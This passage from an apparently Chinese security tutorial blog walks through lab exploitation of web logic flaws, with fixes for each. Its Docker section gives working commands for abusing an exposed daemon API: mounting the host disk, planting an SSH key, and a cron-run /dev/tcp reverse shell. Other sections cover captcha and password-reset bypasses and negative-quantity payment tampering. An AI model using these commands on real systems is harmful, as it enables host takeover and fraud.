[],</span><br><span class="language-prolog"><span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;hybcx&quot;</span></span><br><span class="language-prolog">&#125;</span><br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='image-20230708172612714.png'><img src="image-20230708172612714.png" alt="image-20230708172612714"></p>
+<p>可以看到我们成功创建，登录验证一下</p>
+<p class='item-img' data-src='image-20230708172643840.png'><img src="image-20230708172643840.png" alt="image-20230708172643840"></p>
+<p>也是成功登陆</p>
+<p><strong>漏洞修复</strong></p>
+<p><strong>patch</strong>：加入了dedupe_keys字段用于对重复键的标识，重写了make_object方法，使得jiffy解析JSON的方法和JavaScript一致。</p>
+<p><strong>结论</strong>：尽量不使用多个解析器处理相同的数据。如果项目使用多种语言，不可避免发生这种情况，应该确保解析器间没有功能差异，如这里JSON 解析标准就没有指定重复键的行为。</p>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/qweg/p/16574127.html">https://www.cnblogs.com/qweg/p/16574127.html</a></p>
+<h4 id="3-未经授权访问"><a href="#3-未经授权访问" class="headerlink" title="3-未经授权访问"></a>3. 未经授权访问</h4>
+<p>漏洞介绍：即游客能够访问普通用户甚至超级管理员才能访问的系统信息或者系统功能</p>
+<p>形成原因：主要是系统设计期间没有进行全局用户身份校验；或者校验存在缺陷</p>
+<p>漏洞点：在任何用户登录后才能访问的链接或者功能中都可能存在</p>
+<p>漏洞修复：</p>
+<p>J2EE中存在filter，可以获取用户的cookie等信息</p>
+<p>修复思路：</p>
+<p>建立LoginList，值是当前在线用户的id</p>
+<p>对所有需要登录访问到URL，获取请求request</p>
+<p>再利用 getAttribute(“userid”) 获取其userid</p>
+<p>检查userid是否存在于LoginList中，不存在则直接返回错误跳转</p>
+<p>值得注意的是切勿将错误跳转写到Javascript里面，还返回目标URL页面的相关信息</p>
+<h5 id="Docker-daemon-api未授权访问漏洞"><a href="#Docker-daemon-api未授权访问漏洞" class="headerlink" title="Docker-daemon-api未授权访问漏洞"></a>Docker daemon api未授权访问漏洞</h5>
+<p><strong>漏洞简介</strong></p>
+<p>Docker Daemon把服务暴露在tcp的2375端口上，这样就可以在网络上操作Docker了。Docker本身没有身份认证的功能，只要网络上能访问到服务端口，就可以操作Docker。与上面的<code>docker.sock</code>文件利用类似。</p>
+<p>简单来说：该未授权访问漏洞是因为Docker API可以执行Docker命令，该接口是目的是取代Docker命令界面，通过URL操作Docker。</p>
+<p><strong>环境搭建</strong></p>
+<p>为了更贴近实战，所以不使用vulhub搭建docker，直接在宿主机上直接搭建。<br>
+首先虚拟机创建一台linux（centos7版本）<br>
+机器正常安装好docker<br>
+接着进行文件备份（一下均是以root身份操作）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">cp /lib/systemd/system/docker.service /lib/systemd/system/docker.service.bak<br></code></pre></td></tr></table></figure>
+<p>接着编辑</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">vim /lib/systemd/system/docker.service<br></code></pre></td></tr></table></figure>
+<p>把下面一段代码加入文件结尾</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">[Service]<br>ExecStart=<br>ExecStart=/usr/bin/dockerd -H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='image-20230708180359320.png'><img src="image-20230708180359320.png" alt="image-20230708180359320"></p>
+<p>保存并退出编辑后，重载守护进程以及重启Docker：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">systemctl daemon-reload`<br>service docker restart<br></code></pre></td></tr></table></figure>
+<p>通过执行命令查看是否开放了远程访问端口：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">systemctl status docker.service<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='image-20230708180414805.png'><img src="image-20230708180414805.png" alt="image-20230708180414805"></p>
+<p>如果本地搭建访问不了的话，很大原因是因为防火墙未放行2375端口，放行端口后就可以在其他机器访问到了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">如何在防火墙开启下，放行端口以至于外部可以访问<br><br>添加<br><br>firewall-cmd --zone=public --add-port=5005/tcp --permanent   （--permanent永久生效，没有此参数重启后失效）<br><br>添加端口外部访问权限（这样外部才能访问）<br>firewall-cmd --add-port=5005/tcp<br><br>重新载入，添加端口后重新载入才能起作用<br><br>firewall-cmd --reload<br><br>这些之后，端口是开启成功的，如果没有成功，重启系统试试。<br></code></pre></td></tr></table></figure>
+<p><strong>漏洞检测+利用</strong></p>
+<p>访问192.168.4.92:2375/version，若能访问，证明存在未授权访问漏洞。</p>
+<p class='item-img' data-src='image-20230708181507793.png'><img src="image-20230708181507793.png" alt="image-20230708181507793"></p>
+<p>目标机：192.168.4.92<br>
+攻击机：124.220.233.26</p>
+<p><strong>写入密钥免密登陆</strong></p>
+<p>在已经安装docker的vps上，使用-H参数连接目标主机的docker，使用images命令查询目标系统存在的镜像。</p>
+<p class='item-img' data-src='image-20230708185646585.png'><img src="image-20230708185646585.png" alt="image-20230708185646585"></p>
+<p>使用docker命令创建一个容器，并将宿主机的磁盘挂载到容器中</p>
+<p>docker -H tcp://192.168.4.92:2375 run -it -v /:/mnt a98b9e39cc6d /bin/bash</p>
+<p>a98b9e39cc6d 是镜像的ID<br>
+这条命令的意思是启动一个image ID 为a98b9e39cc6d的容器，并且将该宿主机的根目录挂在到容器的/mnt目录下</p>
+<p class='item-img' data-src='image-20230708185821418.png'><img src="image-20230708185821418.png" alt="image-20230708185821418"></p>
+<p>如果目标机器上没有镜像就需要先pull一个镜像到目标机上。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">docker -H tcp://192.168.4.92:2375 pull busybox<br></code></pre></td></tr></table></figure>
+<p>这个镜像很小，方便下载。</p>
+<p class='item-img' data-src='image-20230708185915206.png'><img src="image-20230708185915206.png" alt="image-20230708185915206"></p>
+<p>有镜像之后就很方便利用了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">docker -H tcp://192.168.4.92:2375 run -it -v /:/mnt 5242710cbd55 /bin/bash<br><br>docker -H tcp://192.168.4.92:2375 run -it --privileged busybox  bin/sh<br>//换成sh的原因可能是，我这里用的finalshell的ssh连接的目标机<br>docker -H tcp://192.168.4.92:2375 run -it -v /:/mnt 5242710cbd55 sh<br></code></pre></td></tr></table></figure>
+<p>启动之后就会获得该容器宿主机的shell</p>
+<p class='item-img' data-src='image-20230708190031855.png'><img src="image-20230708190031855.png" alt="image-20230708190031855"></p>
+<p>因为我们把主机的根目录挂在到了这个容器的/mnt容器下，所以我们可以直接往主机的/root/.ssh目录下写authorized_keys</p>
+<p>我们将攻击机的公钥写入authorized_keys</p>
+<p class='item-img' data-src='image-20230708192011727.png'><img src="image-20230708192011727.png" alt="image-20230708192011727"></p>
+<p>这里我之前目标机与kali都没有公钥，产生公钥可以参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_57414752/article/details/126369367?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168881425016800182134932%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=168881425016800182134932&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-5-126369367-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&amp;utm_term=authorized_keys%E6%96%87%E4%BB%B6%E7%94%9F%E6%88%90&amp;spm=1018.2226.3001.4187">Linux实现ssh免密</a></p>
+<p>成功免密登陆目标服务器</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ssh root@192.168.4.92<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='image-20230708192325602.png'><img src="image-20230708192325602.png" alt="image-20230708192325602"></p>
+<p><strong>写入计划任务反弹shell</strong></p>
+<p>因为docker 有远程连接命令，由于2375端口暴露，可未授权访问，所以现在可以在kali上通过远程方式连接doker</p>
+<p>前面的操作都一致<br>
+唯一不同的就是写的命令和路径<br>
+有很多种写计划任务的方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">docker -H tcp://192.168.4.92:2375 ps<br><br>docker -H tcp://192.168.4.92:2375 images<br></code></pre></td></tr></table></figure>
+<p>链接进去之后，发现没有镜像文件，那么去官方下载一个镜像文件busybox</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">docker -H tcp://192.168.241.142:2375 pull busybox<br></code></pre></td></tr></table></figure>
+<p>接下来启动容器，并进入 busybox 容器</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">docker -H tcp://192.168.4.92:2375 images<br><br>docker -H tcp://192.168.4.92:2375 run -it --privileged busybox bin/sh<br><br>#在kali中启动一个有交互的shell，并且是特权镜像<br><br>#当操作者执行docker run —privileged时，Docker将允许容器访问宿主机上的所有设备，同时修改AppArmor或SELinux的配置，使容器拥有与那些直接运行在宿主机上的进程几乎相同的访问权限。<br></code></pre></td></tr></table></figure>
+<p>进入容器后，使用fdisk -l命令查看磁盘文件<br>
+<strong>注意：在特权模式下，逃逸的方式很多，比如：直接在容器内部挂载宿主机磁盘，然后切换根目录。</strong></p>
+<p class='item-img' data-src='image-20230708205319201.png'><img src="image-20230708205319201.png" alt="image-20230708205319201"></p>
+<p>从返回的type信息中可以判断出，/dev/sda2是主分区，那么接下里直接在容器内部挂载宿主机磁盘</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">新建一个目录：mkdir wxiaoge<br><br>挂载磁盘到新建目录：mount dev/sda2 wxiaoge<br><br>进入目录：cd wxiaoge/<br><br>新建文件：touch wxiaoge.txt<br></code></pre></td></tr></table></figure>
+<p>接下来看一下靶机中确实创建了 wxiaoge.txt 文件，docker逃逸成功</p>
+<p class='item-img' data-src='image-20230708205742734.png'><img src="image-20230708205742734.png" alt="image-20230708205742734"></p>
+<p>接下来可以反弹主机shell<br>
+创建 <a target="_blank" rel="noopener" href="http://wxiao.sh">wxiao.sh</a> 文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">vi wxiaoge.sh<br></code></pre></td></tr></table></figure>
+<p>写入反弹 shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#!/bin/bash<br><br>#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin<br><br>bash -c &quot;bash -i  &gt;&amp;/dev/tcp/192.168.4.92/55555 0&gt;&amp;1&quot;<br></code></pre></td></tr></table></figure>
+<p>之后给 <a target="_blank" rel="noopener" href="http://wxiao.sh">wxiao.sh</a> 添加执行权限，并且写入到定时任务中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">chmod +x wxiao.sh <br><br>echo &#x27;*/1 * * * *  /wxiao.sh&#x27; &gt;&gt; /wxiaoge/var/spool/cron/root<br>#每分钟执行一次wxiaoge.sh 文件<br></code></pre></td></tr></table></figure>
+<p>kali打开监听端口</p>
+<p class='item-img' data-src='image-20230708205907242.png'><img src="image-20230708205907242.png" alt="image-20230708205907242"></p>
+<p>一分钟后成功返回 shell</p>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://www.modb.pro/db/152994">https://www.modb.pro/db/152994</a></p>
+<p><strong>漏洞修复：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1.关闭2375端口 （尤其是公网情况下一定要禁用此端口）<br>2.在防火墙上配置禁止外网访问2375端口<br></code></pre></td></tr></table></figure>
+<h3 id="2-5-图形验证码漏洞"><a href="#2-5-图形验证码漏洞" class="headerlink" title="2-5-图形验证码漏洞"></a>2.5 图形验证码漏洞</h3>
+<h4 id="1-图形验证码突破"><a href="#1-图形验证码突破" class="headerlink" title="1-图形验证码突破"></a>1. 图形验证码突破</h4>
+<p>漏洞介绍：攻击者通过突破图形验证码的验证，可以实现如登录爆破、验证码绕过等攻击</p>
+<p>漏洞原理：</p>
+<p>图形验证码在错误后未失效</p>
+<p>返回验证码信息</p>
+<p>分步验证验证码</p>
+<p>漏洞点：任何存在图形验证码的功能中</p>
+<p>漏洞修复</p>
+<p>一旦验证码使用过了，必须要进行删除，重新生成验证码，可以梵高attribute中</p>
+<p>验证码需要设置超时，时间一到立即删除旧验证码，用户需要获取新的验证码</p>
+<p>验证码只需要返回图片，切勿将生成验证码的字符串也一并返回</p>
+<p>验证码不应该进行分布校验，应该连同请求数据一起发送到目标服务器进行校验，服务器校验通过则返回合法数据，否则返回错误</p>
+<h6 id="pikachu-on-server"><a href="#pikachu-on-server" class="headerlink" title="pikachu-on-server"></a>pikachu-on server</h6>
+<p>测试结果：验证码有验证、无回显，但存在验证码固定（可重复使用）的设计缺陷。<br>
+以下为验证码固定问题测试过程和源码分析。</p>
+<p><strong>测试过程</strong></p>
+<p>输入不正确的账户/密码及正确的验证码测试</p>
+<p class='item-img' data-src='image-20230720085106759.png'><img src="image-20230720085106759.png" alt="image-20230720085106759"></p>
+<p>重复提交该数据包均只返回用户名或密码错误，说明存在验证码固定漏洞。</p>
+<p class='item-img' data-src='image-20230720091018964.png'><img src="image-20230720091018964.png" alt="image-20230720091018964"></p>
+<p>所以我们可利用此漏洞绕过验证码直接对用户名和密码进行暴力破解。</p>
+<p><strong>源码分析</strong></p>
+<p>文件：\vul\burteforce\bf_server.php<br>
+关键代码：</p>
+<p class='item-img' data-src='image-20230720091259221.png'><img src="image-20230720091259221.png" alt="image-20230720091259221"></p>
+<p>在用户名、密码和验证码均不为空的情况下判断输入验证码是否与生成后保存在session中的验证码相同，但比较完后没有删除该session[vcode],导致下一个数据包输入该验证码也会判断正确，出现验证码重复使用问题。</p>
+<p>凭借此漏洞，我们可以对用户名与密码进行爆破，验证码随意即可（但要保证该验证码是在校验页面出现过的验证码）</p>
+<h6 id="pikachu-on-client"><a href="#pikachu-on-client" class="headerlink" title="pikachu-on-client"></a>pikachu-on client</h6>
+<p><strong>测试过程</strong></p>
+<p>通过查看源码发现前端JS判断验证码是否正确，所以先输入正确的验证码绕过前端判断。<br>
+输入不正确的账户/密码及验证码进行抓包测试。</p>
+<p class='item-img' data-src='image-20230720091942472.png'><img src="image-20230720091942472.png" alt="image-20230720091942472"></p>
+<p>由于已经绕过前端js对验证码的判断，可以将请求包中的验证码参数删除。（可以删除vcode参数）</p>
+<p class='item-img' data-src='image-20230720092032392.png'><img src="image-20230720092032392.png" alt="image-20230720092032392"></p>
+<p>再将数据包发送到intruder对用户名和密码进行暴力破解即可。</p>
+<p><strong>源码分析</strong></p>
+<p class='item-img' data-src='image-20230720092457746.png'><img src="image-20230720092457746.png" alt="image-20230720092457746"></p>
+<p>可以看到这里进行的前端js校验</p>
+<p>更多参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6971#toc-20">https://xz.aliyun.com/t/6971#toc-20</a></p>
+<h3 id="2-6-找回密码逻辑漏洞"><a href="#2-6-找回密码逻辑漏洞" class="headerlink" title="2-6-找回密码逻辑漏洞"></a>2.6 找回密码逻辑漏洞</h3>
+<h4 id="1-密码找回漏洞"><a href="#1-密码找回漏洞" class="headerlink" title="1-密码找回漏洞"></a>1. 密码找回漏洞</h4>
+<p>漏洞介绍：攻击者通过密码找回逻辑漏洞，可以重置他人账号密码，危害他人账号安全</p>
+<p>漏洞原理：其实是验证码漏洞的一种：</p>
+<p>验证码时间长可爆破</p>
+<p>返回重置密码凭证</p>
+<p>若加密的重置密码凭证</p>
+<p>漏洞点：任何密码找回处（可延伸至相似具有验证功能） 修改接受校验码目标</p>
+<p>漏洞修复</p>
+<p>一旦验证码使用过了，必须要进行删除，重新生成验证码，可以放到attribute中</p>
+<p>验证码需要设置超时，时间一到立即删除旧验证码，用户需要获取新的验证码</p>
+<p>校验凭证不能够随着返回包进行返回</p>
+<p>验证码不应该进行分布校验，应该连同请求数据一起发送到目标服务器进行校验，服务器校验通过则返回合法数据，否则返回错误</p>
+<p>校验凭证的生成需要进行随机生成，防止凭证破解</p>
+<p>用户身份凭证和权限类漏洞修复一样，需要从attribute中获取</p>
+<h6 id="登录密码重置漏洞-墨者学院"><a href="#登录密码重置漏洞-墨者学院" class="headerlink" title="登录密码重置漏洞-墨者学院"></a>登录密码重置漏洞-墨者学院</h6>
+<p>靶场地址：<a target="_blank" rel="noopener" href="https://www.mozhe.cn/bug/detail/K2sxTTVYaWNncUE1cTdyNXIyTklHdz09bW96aGUmozhe?spm=a2c6h.12873639.article-detail.4.6ee8b738CVQGTH">https://www.mozhe.cn/bug/detail/K2sxTTVYaWNncUE1cTdyNXIyTklHdz09bW96aGUmozhe?spm=a2c6h.12873639.article-detail.4.6ee8b738CVQGTH</a></p>
+<p>打开靶场界面如下：</p>
+<p class='item-img' data-src='image-20230720094805950.png'><img src="image-20230720094805950.png" alt="image-20230720094805950"></p>
+<p>1、通过“朝阳群众”的举报，证实手机号“17101304128”在系统平台从事非法集资、诈骗活动。</p>
+<p>2、请重置“17101304128”登录密码，以便登录获取完整的数字证据</p>
+<p>点击进入重置密码，来到密码重置界面</p>
+<p class='item-img' data-src='image-20230720094833341.png'><img src="image-20230720094833341.png" alt="image-20230720094833341"></p>
+<p>已注册的手机号为18868345809</p>
+<p>先输入手机号17101304128，输入新密码：图形验证码，点击获取短信验证码</p>
+<p class='item-img' data-src='image-20230720094939479.png'><img src="image-20230720094939479.png" alt="image-20230720094939479"></p>
+<p>提示：已发送至该手机，短信已发送有效期为5分钟</p>
+<p>再输入我已注册的手机号18868345809，设置新密码，验证码，获取验证码 得到验证码：<strong>Vxka6a</strong></p>
+<p class='item-img' data-src='image-20230720095004049.png'><img src="image-20230720095004049.png" alt="image-20230720095004049"></p>
+<p class='item-img' data-src='image-20230720095222105.png'><img src="image-20230720095222105.png" alt="image-20230720095222105"></p>
+<p>漏洞点：他说短信已发送至该手机，可是这手机号也不是我的呀，我并不知道验证码是啥。此时就可以大胆的猜想一下，它这个网站的逻辑会不会出现问题，只是统一验证输入的验证码是否是正确的，而没有对绑定的手机号进行校验。我们可以使用刚才得到的验证码863bTV来尝试重置，成功得到key值。</p>
+<p>第二种做法：先用自身的账号进行密码重置流程，在得到验证码后，bp抓包修改手机号参数（换成目标手机号即可）这样同样可以的到key，两种想法都一样，只不过第二种似乎更好理解</p>
+<h3 id="2-7-业务数据篡改漏洞"><a href="#2-7-业务数据篡改漏洞" class="headerlink" title="2-7-业务数据篡改漏洞"></a>2.7 业务数据篡改漏洞</h3>
+<h4 id="1-业务数据篡改（赋值反冲）"><a href="#1-业务数据篡改（赋值反冲）" class="headerlink" title="1-业务数据篡改（赋值反冲）"></a>1. 业务数据篡改（赋值反冲）</h4>
+<p>漏洞介绍：攻击者通过进行数值篡改进行攻击，从而获利</p>
+<p>漏洞原理：</p>
+<p>没有对传输数据添加相关的校验参数</p>
+<p>后台未对参数值进行校验并直接使用数据包中的参数</p>
+<p>漏洞点：抽奖、购买、转账、返现等功能</p>
+<p>漏洞修复：</p>
+<p>对于软件来说，需要保护好内存数据，防止内存数据篡改</p>
+<p>计算传输数据的哈希，并将哈希附加在传输数据中作为校验值，避免被篡改</p>
+<p>先校验数值，防止大整数和负数；接着利用传输的商品ID从数据库中获取商品单价重新进行价格计算；最后生成订单（订单号应为随机值）</p>
+<h5 id="dami-cms-0元支付漏洞"><a href="#dami-cms-0元支付漏洞" class="headerlink" title="dami-cms-0元支付漏洞"></a>dami__cms-0元支付漏洞</h5>
+<p class='item-img' data-src='image-20230720103225959.png'><img src="image-20230720103225959.png" alt="image-20230720103225959"></p>
+<p>直接小p一把梭，注册登录cms看到如上页面</p>
+<p>点击在线充值、我要提现，看到当前余额是0</p>
+<p class='item-img' data-src='image-20230720103328016.png'><img src="image-20230720103328016.png" alt="image-20230720103328016"></p>
+<p>点击产品展示、大米测试产品</p>
+<p class='item-img' data-src='image-20230720103346717.png'><img src="image-20230720103346717.png" alt="image-20230720103346717"></p>
+<p>点击立即购买</p>
+<p class='item-img' data-src='image-20230720103404726.png'><img src="image-20230720103404726.png" alt="image-20230720103404726"></p>
+<p>填写完整送货地址，将付款方式修改为站内扣款</p>
+<p class='item-img' data-src='image-20230720103454420.png'><img src="image-20230720103454420.png" alt="image-20230720103454420"></p>
+<p>点击提交订单，同时使用burp进行抓包操作</p>
+<p>将<code>qty</code>参数修改为-1，然后点击<code>Forward</code>，并取消抓包</p>
+<p class='item-img' data-src='image-20230720103606923.png'><img src="image-20230720103606923.png" alt="image-20230720103606923"></p>
+<p class='item-img' data-src='image-20230720103812794.png'><img src="image-20230720103812794.png" alt="image-20230720103812794"></p>
+<p>可以看到订单已经提交成功了</p>
+<p>此时查看提现页面的余额已经变为6000，也就是将订单中的-6000反加到了账户余额中</p>
+<p>利用0元支付漏洞，在网站商城进行购买操作时，可无需支付货币，对商城造成极大危害。</p>
+<p>应明确业务逻辑，防止出现此情况</p>
+<p class='item-img' data-src='image-20230720103833229.png'><img src="image-20230720103833229.png" alt="image-20230720103833229"></p>
+<h3 id="2-8-执行顺序逻辑漏洞"><a href="#2-8-执行顺序逻辑漏洞" class="headerlink" title="2-8-执行顺序逻辑漏洞"></a>2.8 执行顺序逻辑漏洞</h3>
+<h4 id="1-执行顺序篡改"><a href="#1-执行顺序篡改" class="headerlink" title="1-执行顺序篡改"></a>1. 执行顺序篡改</h4>
+<p>漏洞介绍：攻击者通过篡改分步逻辑中的步骤数字，达到绕过支付、校验等效果</p>
+<p>漏洞原理：程序逻辑分布进行，但是对步骤、验证信息、支付信息没有做好严格校验，导致修改步骤就直接绕过验证或者支付</p>
+<p>漏洞点：任何分布逻辑且带步骤数字，或者利用JS进行步骤控制的功能中</p>
+<p>漏洞修复</p>
+<p>在请求最后一步时候需要带入前面的验证信息，服务端再进行一次校验信息的验证，验证正确方能继续执行数据操作</p>
+<p>也可以及通过getAttributr(“userid”)获取userid进行userid和验证结果绑定，最后一步不带入验证信息，但是仍然要获取userid进行校验</p>
+<p>再最后一步通过验证之后或者服务器收到支付信息后再生成相应的数据交给用户</p>
+<h3 id="2-9-其他类型逻辑漏洞"><a href="#2-9-其他类型逻辑漏洞" class="headerlink" title="2-9-其他类型逻辑漏洞"></a>2.9 其他类型逻辑漏洞</h3>
+<h4 id="1-条件竞争漏洞"><a href="#1-条件竞争漏洞" class="headerlink" title="1-条件竞争漏洞"></a>1. 条件竞争漏洞</h4>
+<p>漏洞介绍：可以通过同时重放大量数据包进行漏洞利用，通常用于突破限量、限额的问题都有奇效</p>
+<p>漏洞原理：由于目标函数中，判断与数据修复两个步骤之间，或者两个数据修改步骤之间存在时间差，且函数未进行同步锁定，则可以造成漏洞</p>
+<p>漏洞点：程序中存在限制，可以猜测到后台有判断与修改操作的方法</p>
+<p>漏洞修复</p>
+<p>修复思路：使用synchronized关键字，可以限制同一时间内访问方法的只有单一线程</p>
+<p>并不是每个条件竞争都必须修复</p>
+<h4 id="2-数据包重放漏洞"><a href="#2-数据包重放漏洞" class="headerlink" title="2-数据包重放漏洞"></a>2. 数据包重放漏洞</h4>
+<p>漏洞介绍：通过数据包重放，可以造成短信轰炸、邮件轰炸、重复提交订单等</p>
+<p>漏洞原理：后台未进行相关操作的技术导致数据包重放</p>
+<p>漏洞点：短信验证码、邮件校验、提交订单等功能。</p>
+<p>修复方案：</p>
+<p>修复思路（针对短信、邮件）</p>
+<p>构造一个Hashmap&lt;String，short&gt;，存放邮箱或电话号码及对应次数</p>
+<p>只要某个邮箱或者电话号码次数够了，就不能继续发送了</p>
+<p>或者计算两次发送的时间间隔，时间过短就不继续发送了</p>
+<p><strong>通用修复方案</strong></p>
+<p>需要建立token机制或验证码机制，一次有效</p>
+<h4 id="3-参数绑定漏洞"><a href="#3-参数绑定漏洞" class="headerlink" title="3-参数绑定漏洞"></a>3. 参数绑定漏洞</h4>
+<p>漏洞介绍：通过添加对象字段相关参数进行数据篡改</p>
+<p>漏洞原理：对象自动绑定被许多框架支持，它允许将HTTP请求参数自动的绑定到对象，开发者没有对其进行安全校验则容易导致数据篡改</p>
+<p>漏洞点：常见的所有输入的地方都会出现这个漏洞，特别是金融、用户、缓存等。</p>
+<p>漏洞修复：Spring MVC中可以使用@InitBinder注释，通过WebDataBinder的方法setAllowedFields、setDisallowedFields设置允许或不允许绑定的参数</p>
+<p><strong>这里了解一下该漏洞产生原理吧</strong></p>
+<p>软件框架有时允许开发人员自动将HTTP请求参数绑定到程序变量或对象中，以使开发人员更容易使用该框架开发。这有时会造成伤害。攻击者有时可以使用这种方法来创建，修改，更新开发人员或者业务本身从未打算设计到的参数，而这些新参数反过来又会影响程序代码中不需要的新变量或对象。</p>
+<p>因此就拿Spring MVC中的自动绑定作为举例，假设有一个用户提交基本信息的功能：</p>
+<p>首先看前端html：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">“addUserInfo”</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">username</span> <span class="hljs-attr">type</span>=<span class="hljs-string">text</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">phone</span> <span class="hljs-attr">type</span>=<span class="hljs-string">text</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">email</span> <span class="hljs-attr">text</span>=<span class="hljs-string">text</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p>很简单，一个form表单，通过post提交username，phone，email到addUserInfo。</p>
+<p>我们看一下用户的实体类：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br>     <span class="hljs-keyword">private</span> String userid;<br>     <span class="hljs-keyword">private</span> String username;<br>     <span class="hljs-keyword">private</span> String phone;<br>     <span class="hljs-keyword">private</span> String email;<br>     <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> isAdmin;<br><br>     <span class="hljs-comment">//Getters &amp; Setters</span><br>   &#125;<br></code></pre></td></tr></table></figure>
+<p>可以看到User的实体类存在除了username，phone，email还有比较重要的userid和isAdmin参数。</p>
+<p>我们接下来看一下controller层如果利用了自动绑定可以写出的处理方式：</p>
